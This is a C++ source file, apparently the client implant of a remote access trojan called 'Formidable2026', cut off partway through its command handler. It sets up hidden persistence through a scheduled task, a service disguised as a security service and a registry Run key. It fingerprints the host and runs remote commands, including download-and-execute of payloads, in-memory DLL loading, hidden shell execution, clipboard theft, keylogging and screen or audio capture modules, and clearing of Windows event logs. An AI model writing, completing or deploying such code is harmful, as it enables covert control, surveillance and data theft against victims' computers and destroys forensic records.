#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shellapi.h>
#include <urlmon.h>
#include <vector>
#include <string>
#include <map>
#include <ctime>
#include <atomic>
#include <thread>
#include <wtsapi32.h>
#include "../Common/Config.h"
#include "../Common/Module.h"
#include "../Common/Utils.h"
#include "../Common/MemoryModule.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wtsapi32.lib")

using namespace Formidable;

// 全局上线配置
CONNECT_ADDRESS g_ServerConfig = DEFAULT_CONFIG;

// 服务运行标志
bool g_IsService = false;

// 模块缓存
HMEMORYMODULE g_hTerminalModule = NULL;
PFN_MODULE_ENTRY g_pTerminalEntry = NULL;
HMEMORYMODULE g_hMultimediaModule = NULL;
PFN_MODULE_ENTRY g_pMultimediaEntry = NULL;
std::map<uint32_t, HMEMORYMODULE> g_ModuleCache;
std::map<uint32_t, PFN_MODULE_ENTRY> g_ModuleEntryCache;

// 多端控制互斥锁，防止资源冲突
CRITICAL_SECTION g_ModuleMutex;
CRITICAL_SECTION g_TerminalMutex;
CRITICAL_SECTION g_MultimediaMutex;

// 路径展开助手
std::wstring ExpandPath(const std::wstring& path) {
    wchar_t expanded[MAX_PATH];
    ExpandEnvironmentStringsW(path.c_str(), expanded, MAX_PATH);
    return expanded;
}

// 处理载荷类型
void ProcessPayload() {
    if (g_ServerConfig.payloadType == 1) { // 下载并执行 EXE
        std::wstring url = UTF8ToWide(g_ServerConfig.szDownloadUrl);
        if (!url.empty()) {
            wchar_t tempPath[MAX_PATH], tempFile[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);
            GetTempFileNameW(tempPath, L"FRM", 0, tempFile);
            
            // 确保后缀是 .exe
            std::wstring exeFile = tempFile;
            exeFile += L".exe";
            
            if (URLDownloadToFileW(NULL, url.c_str(), exeFile.c_str(), 0, NULL) == S_OK) {
                ShellExecuteW(NULL, L"open", exeFile.c_str(), NULL, NULL, SW_HIDE);
            }
        }
    }
    else if (g_ServerConfig.payloadType == 2) { // 远程加载 DLL (内存加载)
        std::wstring url = UTF8ToWide(g_ServerConfig.szDownloadUrl);
        if (!url.empty()) {
            // 这里通常需要异步或者在独立线程执行，避免阻塞主循环
            CreateThread(NULL, 0, [](LPVOID lpParam) -> DWORD {
                std::wstring dllUrl = *(std::wstring*)lpParam;
                delete (std::wstring*)lpParam;

                IStream* pStream = NULL;
                HRESULT hr = URLOpenBlockingStreamW(NULL, dllUrl.c_str(), &pStream, 0, NULL);
                if (hr == S_OK) {
                    std::vector<char> buffer;
                    char tmp[4096];
                    ULONG read = 0;
                    while (pStream->Read(tmp, sizeof(tmp), &read) == S_OK && read > 0) {
                        size_t oldSize = buffer.size();
                        buffer.resize(oldSize + read);
                        memcpy(buffer.data() + oldSize, tmp, read);
                    }
                    pStream->Release();

                    if (!buffer.empty()) {
                        HMEMORYMODULE hMod = MemoryLoadLibrary(buffer.data(), buffer.size());
                        if (hMod) {
                            PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)MemoryGetProcAddress(hMod, "ModuleEntry");
                            if (pEntry) {
                                pEntry(INVALID_SOCKET, NULL); 
                            } else {
                                OutputDebugStringA("[FRM] Remote DLL loaded but 'ModuleEntry' not found\n");
                                MemoryFreeLibrary(hMod);
                            }
                        } else {
                            OutputDebugStringA("[FRM] MemoryLoadLibrary failed for remote DLL\n");
                        }
                    }
                } else {
                    char buf[128];
                    sprintf_s(buf, "[FRM] URLOpenBlockingStreamW failed: 0x%08X\n", hr);
                    OutputDebugStringA(buf);
                }
                return 0;
            }, new std::wstring(url), 0, NULL);
        }
    }
}

// 安装与自启动
void InstallClient() {
    OutputDebugStringA("[FRMD26] Entering InstallClient...\n");
    wchar_t szCurrentPath[MAX_PATH];
    GetModuleFileNameW(NULL, szCurrentPath, MAX_PATH);
    
    std::wstring installDir = ExpandPath(UTF8ToWide(g_ServerConfig.szInstallDir));
    std::wstring installName = UTF8ToWide(g_ServerConfig.szInstallName);
    
    if (!installDir.empty() && !installName.empty()) {
        if (GetFileAttributesW(installDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
            CreateDirectoryW(installDir.c_str(), NULL);
        }
        
        std::wstring destPath = installDir;
        if (destPath.back() != L'\\' && destPath.back() != L'/') destPath += L'\\';
        destPath += installName;
        
        if (_wcsicmp(szCurrentPath, destPath.c_str()) != 0) {
            if (CopyFileW(szCurrentPath, destPath.c_str(), FALSE)) {
                // 如果是新安装，启动新进程并退出旧进程
                // 只有在非提权模式下才启动新进程，避免重复启动
                if (g_ServerConfig.runasAdmin != 1 || IsAdmin()) {
                    ShellExecuteW(NULL, L"open", destPath.c_str(), NULL, NULL, SW_HIDE);
                    exit(0);
                }
            }
        }
    }

    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);

    // 路径包含空格时需要引号，特别是服务和注册表启动
    // 增加缓冲区大小以防止溢出 (MAX_PATH * 2)
    wchar_t szQuotedPath[MAX_PATH * 2];
    swprintf_s(szQuotedPath, MAX_PATH * 2, L"\"%s\"", szPath);
    
    // 1. 计划任务自启
    if (g_ServerConfig.taskStartup == 1) {
        const size_t xmlSize = 4096;
        wchar_t szTaskXml[xmlSize];
        swprintf_s(szTaskXml, xmlSize,
            L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
            L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
            L"<RegistrationInfo>"
            L"<Date>2026-02-08T00:00:00.000000</Date>"
            L"<Author>System</Author>"
            L"</RegistrationInfo>"
            L"<Triggers>"
            L"<LogonTrigger>"
            L"<Enabled>true</Enabled>"
            L"</LogonTrigger>"
            L"<BootTrigger>"
            L"<Enabled>true</Enabled>"
            L"</BootTrigger>"
            L"</Triggers>"
            L"<Principals>"
            L"<Principal id=\"Author\">"
            L"<UserId>S-1-5-18</UserId>" // SYSTEM 账户，确保无登录也能运行
            L"<RunLevel>HighestAvailable</RunLevel>"
            L"</Principal>"
            L"</Principals>"
            L"<Settings>"
            L"<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>"
            L"<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
            L"<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>"
            L"<AllowHardTerminate>true</AllowHardTerminate>"
            L"<StartWhenAvailable>true</StartWhenAvailable>"
            L"<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
            L"<IdleSettings>"
            L"<StopOnIdleEnd>false</StopOnIdleEnd>"
            L"<RestartOnIdle>false</RestartOnIdle>"
            L"</IdleSettings>"
            L"<AllowStartOnDemand>true</AllowStartOnDemand>"
            L"<Enabled>true</Enabled>"
            L"<Hidden>false</Hidden>"
            L"<RunOnlyIfIdle>false</RunOnlyIfIdle>"
            L"<WakeToRun>false</WakeToRun>"
            L"<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" // 无限运行时间
            L"<Priority>7</Priority>"
            L"<RestartOnFailure>"
            L"<Interval>PT1M</Interval>" // 失败后1分钟重启
            L"<Count>999</Count>"
            L"</RestartOnFailure>"
            L"</Settings>"
            L"<Actions Context=\"Author\">"
            L"<Exec>"
            L"<Command>&quot;%s&quot;</Command>"
            L"</Exec>"
            L"</Actions>"
            L"</Task>",
            szPath);

        wchar_t szTempXml[MAX_PATH];
        GetTempPathW(MAX_PATH, szTempXml);
        wcscat_s(szTempXml, L"\\Formidable_Task.xml");
        HANDLE hFile = CreateFileW(szTempXml, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, szTaskXml, (DWORD)(wcslen(szTaskXml) * sizeof(wchar_t)), &written, NULL);
            CloseHandle(hFile);
            
            wchar_t szCmd[4096];
            // 仅在管理员权限下使用 SYSTEM 账户，否则使用当前用户
            if (IsAdmin()) {
                swprintf_s(szCmd, 4096, L"schtasks /create /tn \"Formidable2026\" /xml \"%s\" /f /ru SYSTEM", szTempXml);
            } else {
                swprintf_s(szCmd, 4096, L"schtasks /create /tn \"Formidable2026\" /xml \"%s\" /f", szTempXml);
            }
            
            _wsystem(szCmd);
            DeleteFileW(szTempXml);
            OutputDebugStringA("[FRMD26] Task scheduler entry created.\n");
        }
    }

    // 2. 服务自启
    if (g_ServerConfig.serviceStartup == 1) {
        // 如果当前已经是服务进程，无需再次创建或启动服务
        if (g_IsService) {
            OutputDebugStringA("[FRMD26] Running as service, skipping service creation.\n");
        } else {
            SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (hSCM) {
                SC_HANDLE hService = CreateServiceW(
                    hSCM, L"Formidable2026", L"Formidable Security Service",
                    SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                    SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
                    szQuotedPath, NULL, NULL, NULL, NULL, NULL);
                
                bool bServiceReady = false;

                if (hService) {
                    OutputDebugStringA("[FRMD26] Service created successfully.\n");
                    // 设置服务失败重启操作
                    SERVICE_FAILURE_ACTIONS fa = { 0 };
                    SC_ACTION actions[3];
                    actions[0].Type = SC_ACTION_RESTART;
                    actions[0].Delay = 60000; // 60秒后重启
                    actions[1].Type = SC_ACTION_RESTART;
                    actions[1].Delay = 60000;
                    actions[2].Type = SC_ACTION_RESTART;
                    actions[2].Delay = 60000;
                    
                    fa.dwResetPeriod = 86400; // 1天后重置失败计数
                    fa.lpRebootMsg = NULL;
                    fa.lpCommand = NULL;
                    fa.cActions = 3;
                    fa.lpsaActions = actions;
                    
                    ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);

                    if (StartServiceW(hService, 0, NULL)) {
                        bServiceReady = true;
                    }
                    CloseServiceHandle(hService);
                } else {
                    // 服务可能已存在，尝试打开并更新配置
                    hService = OpenServiceW(hSCM, L"Formidable2026", SERVICE_ALL_ACCESS);
                    if (hService) {
                        OutputDebugStringA("[FRMD26] Service already exists, updating config.\n");
                        SERVICE_FAILURE_ACTIONS fa = { 0 };
                        SC_ACTION actions[3];
                        actions[0].Type = SC_ACTION_RESTART;
                        actions[0].Delay = 60000;
                        actions[1].Type = SC_ACTION_RESTART;
                        actions[1].Delay = 60000;
                        actions[2].Type = SC_ACTION_RESTART;
                        actions[2].Delay = 60000;
                        
                        fa.dwResetPeriod = 86400;
                        fa.lpRebootMsg = NULL;
                        fa.lpCommand = NULL;
                        fa.cActions = 3;
                        fa.lpsaActions = actions;
                        
                        ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);
                        
                        // 确保服务已启动
                        SERVICE_STATUS status;
                        if (QueryServiceStatus(hService, &status)) {
                            if (status.dwCurrentState != SERVICE_RUNNING) {
                                if (StartServiceW(hService, 0, NULL)) {
                                    bServiceReady = true;
                                }
                            } else {
                                bServiceReady = true; // 已经在运行
                            }
                        }
                        CloseServiceHandle(hService);
                    } else {
                        char buf[128];
                        sprintf_s(buf, "[FRMD26] Failed to create or open service. Error: %u\n", GetLastError());
                        OutputDebugStringA(buf);
                    }
                }
                CloseServiceHandle(hSCM);
                
                // 如果服务成功启动/已经在运行，且当前不是服务进程，则退出
                if (bServiceReady) {
                    OutputDebugStringA("[FRMD26] Service started/running. Main process exiting to let service take over.\n");
                    exit(0);
                }
            } else {
                OutputDebugStringA("[FRMD26] Failed to open SCManager.\n");
            }
        }
    }

    // 3. 注册表自启
    if (g_ServerConfig.registryStartup == 1) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"Formidable2026", 0, REG_SZ, (BYTE*)szQuotedPath, (DWORD)(wcslen(szQuotedPath) * 2 + 2));
            RegCloseKey(hKey);
            OutputDebugStringA("[FRMD26] Registry run key set successfully.\n");
        } else {
            OutputDebugStringA("[FRMD26] Failed to open Registry run key.\n");
        }
    }

    // 旧的iStartup逻辑已被新的自启选项替代，不再执行
    // 只有当用户明确勾选新的自启选项时才执行自启
}

static uint64_t Fnv1a64(const void* data, size_t len) {
    const unsigned char* p = (const unsigned char*)data;
    uint64_t hash = 1469598103934665603ULL;
    for (size_t i = 0; i < len; ++i) {
        hash ^= (uint64_t)p[i];
        hash *= 1099511628211ULL;
    }
    return hash;
}

static uint64_t GetStableClientUniqueId() {
    if (g_ServerConfig.clientID != 0) return g_ServerConfig.clientID;

    std::wstring machineGuid;
    HKEY hKey = NULL;
    LONG rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0,
        KEY_READ | KEY_WOW64_64KEY, &hKey);
    if (rc != ERROR_SUCCESS) {
        rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey);
    }
    if (rc == ERROR_SUCCESS && hKey) {
        wchar_t buf[256] = { 0 };
        DWORD cb = sizeof(buf);
        DWORD type = 0;
        if (RegQueryValueExW(hKey, L"MachineGuid", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS && type == REG_SZ) {
            machineGuid = buf;
        }
        RegCloseKey(hKey);
    }

    if (machineGuid.empty()) {
        wchar_t comp[256] = { 0 };
        DWORD csz = 256;
        if (GetComputerNameW(comp, &csz)) machineGuid = comp;
    }

    std::string guidUtf8 = WideToUTF8(machineGuid);
    uint64_t h = guidUtf8.empty() ? 0 : Fnv1a64(guidUtf8.data(), guidUtf8.size());
    if (h == 0) {
        uint64_t t = GetTickCount64();
        h = Fnv1a64(&t, sizeof(t)) ^ ((uint64_t)GetCurrentProcessId() << 32) ^ (uint64_t)GetCurrentThreadId();
        if (h == 0) h = 1;
    }
    return h;
}

// 获取基本信息
void GetClientInfo(ClientInfo& info) {
    memset(&info, 0, sizeof(ClientInfo));
    
    // 基础系统信息
    std::string os = GetOSVersion();
    int bits = GetOSBits();
    if (bits == 64) os += " x64";
    else os += " x86";
    strncpy(info.osVersion, os.c_str(), sizeof(info.osVersion) - 1);
    
    wchar_t wBuf[MAX_PATH];
    DWORD size = MAX_PATH;
    if (GetComputerNameW(wBuf, &size)) {
        std::string utf8 = WideToUTF8(wBuf);
        strncpy(info.computerName, utf8.c_str(), sizeof(info.computerName) - 1);
    } else {
        // Fallback for Service/System
        char envBuf[MAX_PATH];
        if (GetEnvironmentVariableA("COMPUTERNAME", envBuf, MAX_PATH)) {
            strncpy(info.computerName, envBuf, sizeof(info.computerName) - 1);
        } else {
            strncpy(info.computerName, "Unknown Host", sizeof(info.computerName) - 1);
        }
    }
    
    size = MAX_PATH;
    if (GetUserNameW(wBuf, &size)) {
        std::string utf8 = WideToUTF8(wBuf);
        strncpy(info.userName, utf8.c_str(), sizeof(info.userName) - 1);
    } else {
        // Fallback for Service/System
        char envBuf[MAX_PATH];
        if (GetEnvironmentVariableA("USERNAME", envBuf, MAX_PATH)) {
            strncpy(info.userName, envBuf, sizeof(info.userName) - 1);
        } else {
            strncpy(info.userName, "SYSTEM", sizeof(info.userName) - 1);
        }
    }
    // 硬件与进程信息
    std::string cpu = GetCpuBrand();
    strncpy(info.cpuInfo, cpu.c_str(), sizeof(info.cpuInfo) - 1);
    
    strncpy(info.lanAddr, GetLocalIP().c_str(), sizeof(info.lanAddr) - 1);
    
    info.processID = GetCurrentProcessId();
    info.is64Bit = (bits == 64);
    info.isAdmin = IsAdmin() ? 1 : 0;
    info.clientType = g_ServerConfig.iType; // 默认被控端类型
    info.clientUniqueId = GetStableClientUniqueId();
    info.hasCamera = CheckCameraExistence() ? 1 : 0;
    info.hasTelegram = CheckTelegramInstalled() ? 1 : 0;
    {
        wchar_t exePathW[MAX_PATH] = { 0 };
        GetModuleFileNameW(NULL, exePathW, MAX_PATH);
        std::string exePath = WideToUTF8(exePathW);
        strncpy(info.programPath, exePath.c_str(), sizeof(info.programPath) - 1);
    }
    
    // 分组信息
    std::wstring wGroup = UTF8ToWide(g_ServerConfig.szGroupName);
    wcsncpy(info.group, wGroup.c_str(), 127);

    // 活动窗口
    std::string activeWin = ActivityMonitor::GetStatus();
    strncpy(info.activeWindow, activeWin.c_str(), sizeof(info.activeWindow) - 1);
    
    // 版本与安装时间
    strncpy(info.version, GetExeVersion().c_str(), sizeof(info.version) - 1);
    strncpy(info.installTime, GetProcessStartTime().c_str(), sizeof(info.installTime) - 1);
    strncpy(info.uptime, GetSystemUptime().c_str(), sizeof(info.uptime) - 1);
}

std::string GetClipboardText() {
    std::string result;
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t* pText = (wchar_t*)GlobalLock(hData);
            if (pText) {
                result = WideToUTF8(pText);
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
    return result;
}

void SetClipboardText(const std::string& text) {
    if (OpenClipboard(NULL)) {
        EmptyClipboard();
        std::wstring wText = UTF8ToWide(text);
        size_t size = (wText.size() + 1) * sizeof(wchar_t);
        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
        if (hGlobal) {
            void* p = GlobalLock(hGlobal);
            if (p) {
                memcpy(p, wText.c_str(), size);
                GlobalUnlock(hGlobal);
                SetClipboardData(CF_UNICODETEXT, hGlobal);
            }
        }
        CloseClipboard();
    }
}
// 内存加载 DLL 并执行导出函数
uint32_t GetModuleKey(uint32_t cmd) {
    switch (cmd) {
        case CMD_PROCESS_LIST:
        case CMD_PROCESS_KILL:
        case CMD_PROCESS_MODULES:
            return CMD_PROCESS_LIST;
        case CMD_WINDOW_LIST:
        case CMD_WINDOW_CTRL:
            return CMD_WINDOW_LIST;
        case CMD_FILE_LIST:
        case CMD_FILE_DOWNLOAD:
        case CMD_FILE_DOWNLOAD_DIR:
        case CMD_FILE_UPLOAD:
        case CMD_FILE_DELETE:
        case CMD_FILE_RENAME:
        case CMD_FILE_RUN:
            return CMD_FILE_LIST;
        case CMD_SERVICE_LIST:
        case CMD_SERVICE_START:
        case CMD_SERVICE_STOP:
        case CMD_SERVICE_DELETE:
            return CMD_SERVICE_LIST;
        case CMD_REGISTRY_CTRL:
            return CMD_REGISTRY_CTRL;
        case CMD_GET_SYSINFO:
            return CMD_GET_SYSINFO;
    }
    return 0;
}
void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
    bool hasDll = totalDataLen > (int)sizeof(CommandPkg);
    uint32_t effectiveCmd = pkg->cmd;
    if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 != 0) {
        effectiveCmd = pkg->arg2;
    }

    char dbgMsg[256];
    sprintf_s(dbgMsg, "[FRMD26] LoadModuleFromMemory: cmd=%u, effectiveCmd=%u, hasDll=%d, totalDataLen=%d\n",
        pkg->cmd, effectiveCmd, hasDll, totalDataLen);
    OutputDebugStringA(dbgMsg);

    // 1. 终端模块缓存处理
    if (effectiveCmd == CMD_TERMINAL_OPEN) {
        EnterCriticalSection(&g_TerminalMutex);
        if (g_hTerminalModule) {
            if (g_pTerminalEntry) {
                 CommandPkg closePkg = { CMD_TERMINAL_CLOSE, 0, 0 };
                 g_pTerminalEntry(s, &closePkg);
            }
            MemoryFreeLibrary(g_hTerminalModule);
            g_hTerminalModule = NULL;
            g_pTerminalEntry = NULL;
        }
        LeaveCriticalSection(&g_TerminalMutex);
    }
    
    // 2. 多媒体模块缓存处理 (Screen, Video, Voice, Keylog, Mouse, Key)
    bool isMultimedia = (effectiveCmd == CMD_SCREEN_CAPTURE || effectiveCmd == CMD_VIDEO_STREAM || 
                         effectiveCmd == CMD_VOICE_STREAM || effectiveCmd == CMD_KEYLOG ||
                         effectiveCmd == CMD_MOUSE_EVENT || effectiveCmd == CMD_KEY_EVENT ||
                         effectiveCmd == CMD_SCREEN_FPS || effectiveCmd == CMD_SCREEN_QUALITY ||
                         effectiveCmd == CMD_SCREEN_COMPRESS);

    if (isMultimedia && g_hMultimediaModule) {
        EnterCriticalSection(&g_MultimediaMutex);
        if (g_pMultimediaEntry) {
            if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 != 0) {
                CommandPkg runPkg = { 0 };
                runPkg.cmd = effectiveCmd;
                runPkg.arg1 = 1;
                runPkg.arg2 = 0;
                g_pMultimediaEntry(s, &runPkg);
            } else {
                g_pMultimediaEntry(s, pkg);
            }
        }
        LeaveCriticalSection(&g_MultimediaMutex);
        return;
    }

    uint32_t dllSize = pkg->arg1;
    char* dllData = pkg->data;
    
    if (dllSize == 0) return;

    HMEMORYMODULE hMod = MemoryLoadLibrary(dllData, dllSize);
    if (hMod) {
        PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)MemoryGetProcAddress(hMod, "ModuleEntry");
        if (pEntry) {
            // 如果是终端模块，需要常驻内存
            if (effectiveCmd == CMD_TERMINAL_OPEN) {
                EnterCriticalSection(&g_TerminalMutex);
                g_hTerminalModule = hMod;
                g_pTerminalEntry = pEntry;
                LeaveCriticalSection(&g_TerminalMutex);
                OutputDebugStringA("[FRMD26] Terminal module loaded, calling entry function\n");
                pEntry(s, pkg); 
                return; 
            }
            // 如果是多媒体模块，也需要常驻内存
            if (isMultimedia) {
                EnterCriticalSection(&g_MultimediaMutex);
                g_hMultimediaModule = hMod;
                g_pMultimediaEntry = pEntry;
                LeaveCriticalSection(&g_MultimediaMutex);
                CommandPkg runPkg = { 0 };
                runPkg.cmd = effectiveCmd;
                runPkg.arg1 = 1;
                runPkg.arg2 = 0;
                pEntry(s, &runPkg);
                return;
            }

            uint32_t moduleKey = GetModuleKey(effectiveCmd);
            if (moduleKey == 0) moduleKey = effectiveCmd;

            EnterCriticalSection(&g_ModuleMutex);
            auto it = g_ModuleCache.find(moduleKey);
            if (it != g_ModuleCache.end()) {
                MemoryFreeLibrary(it->second);
            }
            g_ModuleCache[moduleKey] = hMod;
            g_ModuleEntryCache[moduleKey] = pEntry;
            LeaveCriticalSection(&g_ModuleMutex);

            // 执行初始命令
            CommandPkg runPkg = *pkg;
            runPkg.cmd = moduleKey;
            runPkg.arg1 = 0; 
            runPkg.arg2 = 0;
            pEntry(s, &runPkg);
            return;
        }
        MemoryFreeLibrary(hMod);
    }
}
void SendPkg(SOCKET s, const void* data, int len) {
    PkgHeader header;
    memcpy(header.flag, "FRMD26?", 7);
    header.originLen = len;
    header.totalLen = sizeof(PkgHeader) + len;
    send(s, (char*)&header, sizeof(PkgHeader), 0);
    send(s, (char*)data, len, 0);
}

void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
    switch (pkg->cmd) {
        case CMD_HEARTBEAT: {
            ClientInfo info;
            GetClientInfo(info);
            
            size_t bodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
            std::vector<char> buffer(bodySize);
            CommandPkg* pkgResp = (CommandPkg*)buffer.data();
            pkgResp->cmd = CMD_HEARTBEAT;
            pkgResp->arg1 = sizeof(ClientInfo);
            pkgResp->arg2 = 0;
            memcpy(pkgResp->data, &info, sizeof(ClientInfo));
            
            SendPkg(s, buffer.data(), (int)bodySize);
            break;
        }
        case CMD_CLIPBOARD_GET: {
            std::string text = GetClipboardText();
            size_t bodySize = sizeof(CommandPkg) - 1 + text.size();
            std::vector<char> buffer(bodySize);
            CommandPkg* pkgResp = (CommandPkg*)buffer.data();
            pkgResp->cmd = CMD_CLIPBOARD_GET;
            pkgResp->arg1 = (uint32_t)text.size();
            pkgResp->arg2 = 0;
            memcpy(pkgResp->data, text.c_str(), text.size());
            SendPkg(s, buffer.data(), (int)bodySize);
            break;
        }
        case CMD_CLIPBOARD_SET:
            SetClipboardText(pkg->data);
            break;
        case CMD_POWER_SHUTDOWN: {
            EnableDebugPrivilege();
            ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
            break;
        }
        case CMD_POWER_REBOOT: {
            EnableDebugPrivilege();
            ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
            break;
        }
        case CMD_POWER_LOGOUT: {
            ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
            break;
        }
        case CMD_UNINSTALL: {
            // 移除自启动 (注册表)
            RemoveFromStartup("Formidable2026");
            
            // 移除自启动 (服务)
            SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (hSCM) {
                SC_HANDLE hService = OpenServiceW(hSCM, L"Formidable2026", SERVICE_ALL_ACCESS);
                if (hService) {
                    SERVICE_STATUS status;
                    ControlService(hService, SERVICE_CONTROL_STOP, &status);
                    DeleteService(hService);
                    CloseServiceHandle(hService);
                }
                CloseServiceHandle(hSCM);
            }

            // 获取自身路径
            wchar_t szPath[MAX_PATH];
            GetModuleFileNameW(NULL, szPath, MAX_PATH);
            
            // 创建自删除批处理
            wchar_t szBatchPath[MAX_PATH];
            GetTempPathW(MAX_PATH, szBatchPath);
            wcscat_s(szBatchPath, L"uninstall.bat");
            
            FILE* f = _wfopen(szBatchPath, L"w");
            if (f) {
                fwprintf(f, L"@echo off\n");
                fwprintf(f, L"ping 127.0.0.1 -n 2 > nul\n");
                fwprintf(f, L"del /f /q \"%s\"\n", szPath);
                fwprintf(f, L"del /f /q \"%%~f0\"\n");
                fclose(f);
                
                // 执行批处理并退出
                ShellExecuteW(NULL, L"open", szBatchPath, NULL, NULL, SW_HIDE);
                ExitProcess(0);
            }
            break;
        }
        case CMD_DOWNLOAD_EXEC: {
            // 数据长度 = totalDataLen - sizeof(CommandPkg) + 1
            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
            std::string url(pkg->data, dataLen);
            
            // 使用URLDownloadToFile下载文件
            wchar_t szTempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, szTempPath);
            wcscat_s(szTempPath, L"downloaded.exe");
            
            std::wstring wUrl = UTF8ToWide(url);
            if (S_OK == URLDownloadToFileW(NULL, wUrl.c_str(), szTempPath, 0, NULL)) {
                // 执行下载的文件
                ShellExecuteW(NULL, L"open", szTempPath, NULL, NULL, SW_HIDE);
            }
            break;
        }
        case CMD_UPLOAD_EXEC: {
            // 数据格式: 文件名长度(4字节) + 文件名 + 文件数据
            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
            if (dataLen > 4) {
                uint32_t nameLen = *(uint32_t*)pkg->data;
                if (nameLen > 0 && nameLen < 256 && (int)(4 + nameLen) < dataLen) {
                    std::string fileName(pkg->data + 4, nameLen);
                    int fileSize = dataLen - 4 - (int)nameLen;
                    
                    // 保存到临时目录
                    wchar_t szTempPath[MAX_PATH];
                    GetTempPathW(MAX_PATH, szTempPath);
                    std::wstring wFileName = UTF8ToWide(fileName);
                    wcscat_s(szTempPath, wFileName.c_str());
                    
                    HANDLE hFile = CreateFileW(szTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        DWORD written;
                        WriteFile(hFile, pkg->data + 4 + nameLen, fileSize, &written, NULL);
                        CloseHandle(hFile);
                        
                        // 执行上传的文件
                        ShellExecuteW(NULL, L"open", szTempPath, NULL, NULL, SW_HIDE);
                    }
                }
            }
            break;
        }
        case CMD_OPEN_URL: {
            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
            std::string url(pkg->data, dataLen);
            std::wstring wUrl = UTF8ToWide(url);
            ShellExecuteW(NULL, L"open", wUrl.c_str(), NULL, NULL, SW_SHOW);
            break;
        }
        case CMD_SHELL_EXEC: {
            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
            if (dataLen > 0) {
                std::string cmd(pkg->data, dataLen);
                std::wstring wCmd = UTF8ToWide(cmd);
                
                // 解析命令和参数
                // 简单的实现：直接传给 ShellExecute
                ShellExecuteW(NULL, L"open", L"cmd.exe", (L"/c " + wCmd).c_str(), NULL, SW_HIDE);
            }
            break;
        }
        case CMD_CLEAN_EVENT_LOG: {
            EnableDebugPrivilege();
            
            // 清除主要事件日志
            const wchar_t* logs[] = { L"System", L"Application", L"Security" };
            for (int i = 0; i < 3; i++) {
                HANDLE hLog = OpenEventLogW(NULL, logs[i]);
                if (hLog) {
                    ClearEventLogW(hLog, NULL);
                    CloseEventLog(hLog);
                }
            }
            break;
        }
        case CMD_SET_GROUP: {
            // 设置分组 - 保存到配置或仅在内存中维护
            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
            if (dataLen > 0 && dataLen < 256) {
                std::string groupName(pkg->data, dataLen);
                // 这里可以将分组信息保存到注册表或配置文件
                // 当前仅存储在全局变量中（需要在ClientInfo中添加group字段）
            }
            break;
        }
        case CMD_MESSAGEBOX: {
            // 弹出消息框
            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
            if (dataLen > 0) {
                std::string message(pkg->data, dataLen);
                std::wstring wMessage = UTF8ToWide(message);
                MessageBoxW(NULL, wMessage.c_str(), L"来自主控的消息", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
            }
            break;
        }
        case CMD_RECONNECT: {
            // 重新连接（关闭当前socket，主循环会自动重连）
            closesocket(s);
            break;
        }
        case CMD_TERMINAL_OPEN:
